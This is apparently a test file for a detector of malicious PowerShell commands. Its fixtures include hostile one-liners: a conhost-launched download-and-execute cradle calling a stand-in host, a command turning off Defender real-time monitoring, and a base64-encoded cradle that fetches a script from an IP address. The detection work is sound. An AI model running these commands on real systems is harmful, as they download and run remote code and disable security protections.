import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('analyze() sees the launcher/wrapper prefix (not just the -Command body)', () => {
  it('conhost --headless powershell -c <cradle> fires clickfix + the conhost LOLBin', async () => {
    const r = await analyze('conhost --headless powershell -nop -c iex(irm http://x.test/a)')
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('clickfix')
    expect(ids).toContain('lolbin')
  })

  it('a launcher prefix with a LOCAL (non-download) payload still yields signals', async () => {
    const r = await analyze('conhost --headless powershell -w hidden -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true"')
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('lolbin')          // conhost
    expect(ids).toContain('defender-tamper')
  })

  it('an -enc one-liner still decodes AND its inner payload signals fire through analyze()', async () => {
    // -enc payload decodes to: IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')
    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
    const r = await analyze('powershell -nop -w hidden -enc ' + enc)
    expect(r.signals.map((s) => s.id)).toContain('download-cradle')
  })
})
